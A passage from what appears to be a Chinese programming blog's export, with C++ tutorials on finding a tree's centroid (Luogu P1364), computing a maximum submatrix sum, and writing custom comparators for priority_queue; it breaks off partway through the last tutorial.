    <url>/2021/04/18/%E6%A0%91%E7%9A%84%E9%87%8D%E5%BF%83/</url>
    <content><![CDATA[<blockquote>
<p>本文参考洛谷对于<a href="https://www.luogu.com.cn/problem/solution/P1364" target="_blank" rel="noopener">P1364</a>的题解</p>
</blockquote>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p> 对于树上的每一个点，计算其所有子树中最大的子树节点数，这个值最小的点就是这棵树的重心。 <a id="more"></a></p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul>
<li>树中所有点到某个点的距离和中，到重心的距离和是最小的，如果有两个重心，他们的距离和一样 </li>
<li>插入或删除一个点，树的重心的位置最多移动一个单位。 </li>
<li>把两棵树通过一条边相连，新的树的重心在原来两棵树重心的连线上。 </li>
</ul>
<p>这些性质我就不证明了，<del>比较懒</del>（不太懂证明）</p>
<h2 id="求法"><a href="#求法" class="headerlink" title="求法"></a>求法</h2><h3 id="无权树"><a href="#无权树" class="headerlink" title="无权树"></a>无权树</h3><p>实际上，一个如果定义<code>size[i]</code>为以<code>i</code>节点的为根的子树的节点个数，可以很轻易地得到</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="23.361ex" height="5.447ex" viewbox="0 -1250 10325.7 2407.8" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-2-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/><path id="MJX-2-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/><path id="MJX-2-TEX-I-1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/><path id="MJX-2-TEX-N-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/><path id="MJX-2-TEX-I-1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-N-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/><path id="MJX-2-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path id="MJX-2-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path id="MJX-2-TEX-LO-2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"/><path id="MJX-2-TEX-I-1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(2023, 0)"><use xlink:href="#MJX-2-TEX-I-1D462"/></g><g data-mml-node="mo" transform="translate(2595, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g><g data-mml-node="mo" transform="translate(3150.8, 0)"><use xlink:href="#MJX-2-TEX-N-3D"/></g><g data-mml-node="mn" transform="translate(4206.6, 0)"><use xlink:href="#MJX-2-TEX-N-31"/></g><g data-mml-node="mo" transform="translate(4928.8, 0)"><use xlink:href="#MJX-2-TEX-N-2B"/></g><g data-mml-node="munderover" transform="translate(5929, 0)"><g data-mml-node="mo"><use xlink:href="#MJX-2-TEX-LO-2211"/></g><g data-mml-node="TeXAtom" transform="translate(550.5, -1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D463"/></g></g><g data-mml-node="TeXAtom" transform="translate(722, 1150) scale(0.707)" data-mjx-texclass="ORD"/></g><g data-mml-node="mi" transform="translate(7539.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(8008.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(8353.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(8818.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(9284.7, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(9562.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D463"/></g><g data-mml-node="mo" transform="translate(10047.7, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g></g></g></svg></p>
<p>其中<code>v</code>是每一个<code>u</code>的邻接节点。</p>
<p><code>C++</code>实现方式</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> total;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">10000</span>;</span><br><span class="line"><span class="comment">// 邻接表</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; treeTable[MAX_N + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// treeSize[i]表示以i为根、向下包含的子树的节点个数（包含自身）</span></span><br><span class="line"><span class="keyword">int</span> treeSize[MAX_N + <span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> minNode;</span><br><span class="line"><span class="keyword">int</span> minBalance = INF;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 至少为 1</span></span><br><span class="line">    treeSize[nodeId] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// maxSubTree代表nodeId的各个子结点中最大的子树数目</span></span><br><span class="line">    <span class="keyword">int</span> maxSubTree = <span class="number">-1</span>, len = treeTable[nodeId].<span class="built_in">size</span>(), son;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        son = treeTable[nodeId][i];</span><br><span class="line">        <span class="keyword">if</span> (son != parent) &#123;</span><br><span class="line">            dfs(son, nodeId);</span><br><span class="line">            treeSize[nodeId] += treeSize[son];</span><br><span class="line">            maxSubTree = <span class="built_in">max</span>(maxSubTree, treeSize[son]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 向下或者向上的子树中，选取一个，即父节点所在的子树也是作为该节点的“子树”</span></span><br><span class="line">    maxSubTree = <span class="built_in">max</span>(maxSubTree, total - treeSize[nodeId]);</span><br><span class="line">    <span class="keyword">if</span> (maxSubTree &lt; minBalance) &#123;</span><br><span class="line">        minBalance = maxSubTree;</span><br><span class="line">        minNode = nodeId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input the number of total node\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;total);</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input every edge as u v\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= total - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u, &amp;v);</span><br><span class="line">        treeTable[u].push_back(v);</span><br><span class="line">        treeTable[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    minNode = <span class="number">0</span>;</span><br><span class="line">    minBalance = INF;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The center of gravity of the tree is %d, Maximum node number of a subtree is %d\n"</span>,</span><br><span class="line">             minNode, minBalance);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="带权树"><a href="#带权树" class="headerlink" title="带权树"></a>带权树</h3><p>以洛谷<a href="https://www.luogu.com.cn/problem/P1364" target="_blank" rel="noopener">P1364</a>为例，其它背景亦类似：</p>
<p>该题可转为找树的重心进行求解。</p>
<p>使用<code>f[u]</code>表示以<code>u</code>为根的总距离 ， <code>size[u]</code>表示以<code>u</code>为根的子树的大小（当然了，本题要设置为相应的权值） ，因此子树的重心就是：</p>
<p><code>w</code>,其中<code>f[w] = min(f[i]),1 &lt;= i &lt;= n</code>.</p>
<p>在算法的开始之前，需要先任意求一个点作为根进行深度优先搜索，求出以该点为根的总距离，这里以<code>1</code>为例。</p>
<p>对于每一个<code>u</code>能达到的点<code>v</code> ，可以使用下面的方程进行求解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[v] &#x3D; f[u] + size[1] - size[v] - size[v]</span><br></pre></td></tr></table></figure>

<p>上面的式子的意义是：</p>
<p> 当根从<code>u</code>变为<code>v</code>的时候，<code>v</code>的子树的所有节点原本的距离要到 <code>u</code>，现在只需要到<code>v</code>，即这<code>size[v]</code>个节点距离都减小<code>1</code>，与此同时，除了以<code>v</code>为根的子树节点外的所有的点，原本只要到<code>u</code>即可，现在要到<code>v</code>，即每个节点距离都增加了<code>1</code>，而这些节点共有<code>size[1] - size[v]</code>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">101</span>;</span><br><span class="line"><span class="keyword">int</span> treeTable[MAX_N][<span class="number">2</span>], nums[MAX_N], treeSize[MAX_N], f[MAX_N];</span><br><span class="line"><span class="comment">// deepth 是该节点距离 1 号节点的距离</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent, <span class="keyword">int</span> deepth)</span></span>&#123;</span><br><span class="line">    treeSize[nodeId] = nums[nodeId];</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 如果存在左孩子</span></span><br><span class="line">    <span class="keyword">if</span> (lChild)&#123;</span><br><span class="line">        dfs(lChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[lChild];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果存在右孩子</span></span><br><span class="line">    <span class="keyword">if</span> (rChild)&#123;</span><br><span class="line">        dfs(rChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[rChild];</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">1</span>] += nums[nodeId] * deepth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> minAns = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(lChild)&#123;</span><br><span class="line">        f[lChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[lChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(lChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rChild)&#123;</span><br><span class="line">        f[rChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[rChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(rChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    minAns = <span class="built_in">min</span>(minAns, f[nodeId]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n, w, u, v;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;nums[i], &amp;treeTable[i][<span class="number">0</span>], &amp;treeTable[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    dp(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; minAns &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>贪心算法</tag>
        <tag>动态规划</tag>
        <tag>递归</tag>
        <tag>C++</tag>
        <tag>深度优先</tag>
      </tags>
  </entry>
  <entry>
    <title>最大子矩阵和</title>
    <url>/2021/04/11/%E6%9C%80%E5%A4%A7%E5%AD%90%E7%9F%A9%E9%98%B5%E5%92%8C/</url>
    <content><![CDATA[<p>最大子矩阵和，可以使用动态规划的思想 </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">101</span>][<span class="number">101</span>], sums[<span class="number">101</span>][<span class="number">101</span>], temp[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">oneMatMaxSum</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nowSum = <span class="number">0</span>, maxSum = <span class="number">-128</span> * <span class="number">100</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (nowSum &gt; <span class="number">0</span>)nowSum += temp[i];</span><br><span class="line">        <span class="keyword">else</span> nowSum = temp[i];</span><br><span class="line">        maxSum = <span class="built_in">max</span>(maxSum, nowSum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给出一个方针  求最大子矩阵和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">            sums[i][j] = num[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            sums[i][j] += sums[i - <span class="number">1</span>][j];</span><br><span class="line">    <span class="keyword">int</span> maxSum = <span class="number">-128</span>, nowSum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="comment">// temp 保存的是从 第 i 行到 第 j 行所对应的矩阵每一列的和</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k  = <span class="number">0</span>; k &lt; n;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>)temp[k] = sums[j][k];</span><br><span class="line">                <span class="keyword">else</span> temp[k] = sums[j][k] - sums[i - <span class="number">1</span>][k];</span><br><span class="line">            &#125;</span><br><span class="line">            nowSum = oneMatMaxSum();</span><br><span class="line">            maxSum = <span class="built_in">max</span>(nowSum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; maxSum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>使用C++的优先队列时自定义比较函数</title>
    <url>/2021/04/10/%E4%BD%BF%E7%94%A8C-%E7%9A%84%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97%E6%97%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>在<code>C++</code>中，优先队列是一种底层使用堆实现的数据结构，位于队首的元素总是目前所有元素中最优的；</p>
<a id="more"></a>

<p><strong>所在头文件：</strong><code>#include &lt;queue&gt;</code></p>
<p><strong>定义方式：</strong><code>priority_queue&lt;Type, Container, Functional&gt;</code><br>而<code>C++</code>也提供了两种简单的比较方式，即大顶堆小顶堆</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 小顶堆</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt;greaterQue;</span><br><span class="line"><span class="comment">// 大顶堆</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, less&lt;<span class="keyword">int</span>&gt; &gt;lessQue;</span><br><span class="line">greaterQue.push(<span class="number">1</span>);</span><br><span class="line">greaterQue.push(<span class="number">5</span>);</span><br><span class="line">greaterQue.push(<span class="number">2</span>);</span><br><span class="line">lessQue.push(<span class="number">1</span>);</span><br><span class="line">lessQue.push(<span class="number">5</span>);</span><br><span class="line">lessQue.push(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// lessQue  = [5, 1, 2]</span></span><br><span class="line"><span class="comment">// greaterQue = [1, 5, 2]</span></span><br></pre></td></tr></table></figure>

<p>当我们的队列元素不是普通数据类型的时候，我们的比较方式有可能很复杂，我们需要自行定义比较函数，例如当我们需要对结构体进行维护优先队列的时候，一般有两种方法：</p>
<ul>
<li>在结构体中重载运算符</li>
<li>结构体外部定义方法，使用该方法进行构造队列</li>
</ul>
<p>例如，我有一个学生结构体，想要构建一个队首的学生是年龄最小的，当年龄都相同的时候，名字按照字典顺序小的排在前面：</p>
<p><strong>法一：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line">    Stu(<span class="keyword">int</span> age1, <span class="built_in">string</span> name1)&#123;</span><br><span class="line">        age = age1;</span><br><span class="line">        name = name1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (<span class="keyword">const</span> Stu &amp;s1) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s1.age == age)<span class="keyword">return</span> name &gt; s1.name;</span><br><span class="line">        <span class="keyword">return</span> age &gt; s1.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1;</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"yalexin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">11</span>, <span class="string">"axin"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"aaaaa"</span>&#125;);</span><br><span class="line">    que1.push(Stu&#123;<span class="number">12</span>, <span class="string">"bbbbb"</span>&#125;);</span><br><span class="line">    <span class="keyword">while</span>(!que1.empty())&#123;</span><br><span class="line">        Stu top = que1.top();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"age ： "</span> &lt;&lt; top.age &lt;&lt; <span class="string">", name : "</span> &lt;&lt; top.name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        que1.pop(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于上面的代码，控制台输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age ： 11, name : axin</span><br><span class="line">age ： 11, name : yalexin</span><br><span class="line">age ： 12, name : aaaaa</span><br><span class="line">age ： 12, name : bbbbb</span><br></pre></td></tr></table></figure>

<p>注意当你打算使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>的时候，结构体中需要重载的运算符是<code>&gt;</code>，相应的，你打算使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;Stu, <span class="built_in">vector</span>&lt;Stu&gt;, greater&lt;Stu&gt; &gt;que1</span><br></pre></td></tr></table></figure>

<p>的时候，你的结构体中就应该重载<code>&lt;</code></p>
<p><strong>法二：</strong></p>
